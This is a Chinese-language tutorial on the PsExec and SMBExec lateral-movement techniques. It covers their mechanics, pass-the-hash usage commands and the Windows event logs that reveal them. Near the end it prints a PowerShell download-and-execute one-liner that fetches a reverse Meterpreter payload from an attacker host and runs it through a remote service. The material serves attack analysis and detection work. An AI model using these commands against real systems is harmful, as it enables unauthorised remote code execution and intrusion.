## 了解Psexec

### 什么是Psexec

`PsExec`是由`Mark Russinovich`创建的 [Sysinternals
Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)中包含的工具。最初，它旨在作为系统管理员的便利工具，以便他们可以通过在远程主机上运行命令来执行维护任务。`PsExec`可以算是一个轻量级的
telnet
替代工具，它使您无需手动安装客户端软件即可执行其他系统上的进程，并且可以获得与命令控制台几乎相同的实时交互性。PsExec最强大的功能就是在远程系统和远程支持工具（如
ipconfig、whoami）中启动交互式命令提示窗口，以便显示无法通过其他方式显示的有关远程系统的信息。

### 利用方式

#### 官方Pstools-psexec

针对远程建立连接的方式有两种：

一种先建立IPC通道连接，然后直接使用，操作如下：

    
    
    # 先net use 连接上IPC
     net use \\192.168.0.1\ipc$ "password123!@#" /user:alibaba
     
    # 确认是否进入IPC会话
    .\PsExec64.exe  \\ip  cmd.exe   弹cmd

另一种时在psexec的参数中指定账户密码 操作如下：

    
    
    .\PsExec64.exe \\192.168.0.1 –u administrator –p password

#### impacket-psexec

    
    
    #非官方自带-参考 impacket 工具包使用，操作简单，容易被杀
    PsExec.exe -hashes :NTHASH [./]administrator@10.1.2.3 #工作组
    PsExec.exe -hashes :NTHASH domain/administrator@10.1.2.3 #域

### 工作原理

它的背后到底发生了些什么，我们来看看：

  * 将`PSEXESVC.exe`上传到`ADMIN$`（指向`/admin$/system32/PSEXESVC.EXE`）共享文件夹内，也可能时其它共享文件夹内的随机可执行文件名称。如：存在exchange时共享文件夹为：address共享。

  * 远程创建用于运行`PSEXESVC.exe`的服务；

  * 远程启动服务。

`PSEXESVC`服务充当一个重定向器。它在远程系统上运行指定的可执行文件（事例中的是`cmd.exe`）。同时，它通过主机之间来重定向进程的输入/输出（利用命名管道）。

### 详细过程

  * 使用提供的凭证，通过`SMB 会话`进行身份验证。

  * 通过`SMB`访问默认共享文件夹`ADMIN$`，并上载`PSEXESVC.exe`；

![](https://image.3001.net/images/20220505/1651751170_6273b902c656cd8c650a9.png!small)

  * 打开`\\RDC\pipe\svcctl`的句柄，与`服务控制管理器（SCM）`进行通信，这使得我们能够远程创建/启动服务。此时使用的是`SVCCTL`服务，通过对`SVCCTL服务`的`DCE/RPC`调用来启动`PsExec`;

  * 使用上传的`PSEXESVC.exe`作为服务二进制文件，调用`CreateService 函数`；

  * 调用`StartServices 函数`；

![](https://image.3001.net/images/20220505/1651751199_6273b91fd015c9698782f.png!small)![](https://image.3001.net/images/20220505/1651751216_6273b9306e25509fac002.png!small)

  * 正如下面的`Wireshark`所捕获到的数据，它是创建了命名管道来重定向 stdin（输入）、stdout（输出）、stderr（输出）。

![](https://image.3001.net/images/20220505/1651751241_6273b9493df7f1e2f5c6a.png!small)

总共创建了4个命名管道，一个用于服务本身，另外的管道用于重定向进程的 stdin、stdout、stderr。

![](https://image.3001.net/images/20220505/1651751260_6273b95c6b3de89054b9b.png!small)

### 利用条件

    
    
    1、远程机器的 139 或 445 端口需要开启状态，即 SMB；  
    2、明文密码或者 NTLM 哈希；  
    3、具备将文件写入共享文件夹的权限；  
    4、能够在远程机器上创建服务：SC_MANAGER_CREATE_SERVICE (访问掩码：0x0002)；  
    5、能够启动所创建的服务：SERVICE_QUERY_STATUS（访问掩码：0x0004）+ SERVICE_START（访问掩码：0x0010）

 **注意**

    
    
    NTLM != NTLM v1/v2 ；  
    NTFS 权限 != 共享权限；  
    如果使用的是 Sysinternal 的 PsExec，它是会将 PSEXESVC.exe 复制到 ADMIN$，因此是具备访问它的权限；  
    PSEXESVC 服务将会安装在远程系统中，此时将会生成 Event 4697、7045 这2种事件日志；  
    PsExec 2.1版本之后，不再是明文传输。

在多数情况下，即使账号出现泄漏情况，使用`PsExec`， 也无法完成第4和第5点的要求，因为账号不是特权账号（RID500、域管理员）

### 日志分析

psexec在完成一次正常的命令执行时，产生了那些日志。

    
    
    psexec.exe \xxx.xxx.xxx.xxx -u username -p password -s cmd  
    # 返回一个指定PC的system权限的交互式shell

在执行上述命令的一瞬间，目标机器上事件日志中出现了如下日志记录：

系统日志

![](https://image.3001.net/images/20220505/1651751332_6273b9a488941aeee18e3.png!small)

安全日志

![](https://image.3001.net/images/20220505/1651751352_6273b9b83000fa2164ae4.png!small)

7036日志信息提示如下：

    
    
    PSEXESVC 服务处于正在运行状态。

7045日志信息提示如下：

    
    
    服务已安装在系统中。  
    服务名称: PSEXESVC  
    服务文件名: %SystemRoot%\PSEXESVC.exe  
    服务类型: 用户模式服务  
    服务启动类型: 按需启动  
    服务帐户: LocalSystem

4697日志中关键日志信息：

    
    
    ServiceFileName：%SystemRoot%\PSEXESVC.exe

4624中日志中提示登录帐户为：

    
    
    TargetUserName：Administrator

5145日志中关键日志信息：

    
    
    使用者:  
    安全 ID:		TESTDOMAIN\Administrator  
    帐户名:		Administrator  
    帐户域:		TESTDOMAIN  
    登录 ID:		0x25A393  
    网络信息:	  
    对象类型:		File  
    源地址:		192.168.0.104  
    源端口:		49165  
    共享信息:  
    共享名称:		\*\ADMIN$  
    共享路径:		??\C:\Windows  
    相对目标名称:	PSEXESVC.exe

综述，执行该程序一定会出现如下日志：

    
    
    系统日志  
    7045  
    7036  
    安全日志  
    4697  
    4624  
    5145

注意：日志的产生需要开启审核策略

  * 7045、7036此类系统日志无需设置，默认开启
  * 4697、4624、5145此类安全审核日志需要自定义设置高级审核策略。
  * 4697：高级审核策略配置->审核策略->系统->审核安全系统扩展->成功
  * 4624：高级审核策略配置->审核策略->登录\注销->审核登录->成功
  * 5145：高级审核策略配置->审核策略->对象访问->审核详细的文件共享->成功和失败

## 了解SMBexec

SMBExec 与 PSExec 非常相似，但是，SMBExec 不会将二进制文件放入磁盘。SMBExec
利用一个批处理文件和一个临时文件来执行和转发消息。与 PSExec 一样，SMBExec 通过 SMB 协议 (445/TCP) 发送输入并接收输出。

### 利用方式

    
    
    ## 工作组环境下  
    # 明文密码  
    .\smbexec.exe 用户名:密码@ip  
    .\smbexec.exe admin:admin@192.168.124.165  
      
    # hash  
    .\smbexec.exe -hashes :NTLMhash 用户名@ip  
    .\smbexec.exe -hashes :209c6174da490caeb422f3fa5a7ae634 admin@192.168.124.165  
      
    # 在域环境下  
    # 明文密码  
    .\smbexec.exe 域名/用户名:密码@ip  
      
    # hash  
    .\smbexec.exe -hashes :NTLMhash 域名/用户名@ip

### 详细过程

让我们仔细看看 SMBExec 是如何工作的。让我们使用 SMBExec
建立到远程机器的交互式连接。正如我们在图中看到的，我们已经成功地建立了与目标机器的连接。出于分析目的，让我们执行一个命令来请求Notepad.exe运行一个实例。

    
    
    # 执行命令获取会话  
      
    C:\Users\saul\Desktop\impacket-examples-windows>smbexec.exe -hashes :ccef208c6485269c20db2cad21734fe  
    7 redteam.red\administrator@10.10.10.8

![](https://image.3001.net/images/20220505/1651751395_6273b9e31514d1ad863ef.png!small)

我们很快就会看到，我们失去了向远程机器发送进一步输入的能力。发生这种情况是因为我们仍在等待远程机器的命令输出......这种情况非常适合在远程机器上进行分析。
如果我们前往远程机器并打开[Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer)的一个实例，我们可以找到 Notepad.exe 进程并查看进程树。
我们可以看到 Notepad.exe 进程是 CMD.exe 的子进程。如果我们将鼠标悬停在 CMD.exe
上，我们可以看到它正在执行存储在C:\Windows\TEMP\execute.bat. 读取这个文件中存储了哪些数据

![](https://image.3001.net/images/20220505/1651751433_6273ba09ad90f9f45ca35.png!small)

在读取execute.bat文件中的数据后，我们注意到发送到远程机器的输入被附加到文件的开头。批处理文件本质上是将我们的输入发送到远程机器，执行它，并将输出重定向到一个名为`\\127.0.0.1\C$__output`的文件中

![](https://image.3001.net/images/20220505/1651751477_6273ba3553bfb3f03214b.png!small)

系统日志

![](https://image.3001.net/images/20220505/1651751491_6273ba439123196ac1d3c.png!small)

![](https://image.3001.net/images/20220505/1651751503_6273ba4f99088144194db.png!small)

解读：

  * 服务ImagePath包含要执行的命令字符串（%COMSPEC% 指向 cmd.exe 的绝对路径）

  * 它将需要执行的命令回显到 bat 文件，将 stdout 和 stderr 重定向到 Temp 文件

  * 然后执行 bat 文件，执行完毕后将其删除。

查看流量记录

![](https://image.3001.net/images/20220505/1651751523_6273ba63ade5686fcec21.png!small)

### 原理总结

通过以上分析，可以发现smbexec本质依然是先建立IPC$共享，然后通过svcctl协议在目标主机创建和启动服务，不过特殊的一点在于它会将用户需要执行的命令存放在服务中的ImagePath属性中，正是基于这一点，每执行一次命令就需要创建一次服务，每次执行命令也会生成7045和7009两条与服务相关的系统日志记录。
执行命令的过程：

  * 首先会将命令存放进入%TEMP%\execute.bat文件的头部

  * 运行execute.bat文件并将执行的结果储存至C$共享的__output文件中

  * 删除execute.bat文件

  * 客户端通过读取目标C$共享的__output临时文件获取执行结果

小细节：使用smbexec时，连接到目标系统时会自动运行一条 cd 命令

### 利用条件

    
    
    1、远程机器的 139 或 445 端口需要开启状态，即 SMB；  
    2、开启IPC$和C$ ,具备将文件写入共享文件夹的权限；  
    3、能够在远程机器上创建服务  
    4、能够启动所创建的服务

### 衍生：通过服务执行命令

正如 smbexec 所展示的，可以直接从服务 imagePath执行命令，而不需要二进制文件。如果只需要在目标 Windows
机器上执行一个任意命令，这可能是一个有用的技巧。 作为一个简单的示例，让我们使用没有二进制文件的远程服务获取 Meterpreter shell 。
我们将使用 Metasploit 的web_delivery模块并选择一个带有反向 Meterpreter 有效负载的 PowerShell
目标。侦听器已设置，它告诉我们要在目标机器上执行的命令：

    
    
    powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]:: DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n'); 

在我们的 Windows 攻击框中，我们创建了一个远程服务（“metpsh”）并设置 binPath 以使用我们的有效负载执行 cmd.exe：

![](https://image.3001.net/images/20220505/1651751551_6273ba7f7dd29ebc76b67.png!small)

然后启动它：

![](https://image.3001.net/images/20220505/1651751567_6273ba8fc0f7c21700516.png!small)它出错是因为我们的服务没有响应，但是如果查看
Metasploit 侦听器，我们会看到回调已完成并且有效负载已执行。

## 参考文章

[https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/#psexec)

<https://blog.csdn.net/Ping_Pig/article/details/121229030>

[https://rcoil.me/2019/08/【知识回顾】深入了解
PsExec/](https://rcoil.me/2019/08/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%20PsExec/)

